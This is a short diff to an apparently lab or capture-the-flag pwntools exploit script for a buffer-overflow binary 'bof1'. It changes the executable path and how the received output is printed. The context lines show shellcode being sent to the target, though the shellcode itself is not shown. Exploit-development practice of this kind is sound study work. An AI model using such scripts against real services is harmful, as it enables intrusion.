@@ -7,7 +7,7 @@ import sys
 context.arch = 'amd64'
 context.os = 'linux'
 
-exe = './bof1'
+exe = '../spec/bof1'
 port = 12342
 
 elf = ELF(exe)
@@ -64,7 +64,7 @@ r.sendafter(b"name? ", b"Test")
 r.sendafter(b"message: ", sc)
 r.recvuntil(b'you!\n')
 
-print(r.recv().decode())
+print(r.recv())
 r.close()
 
 # vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
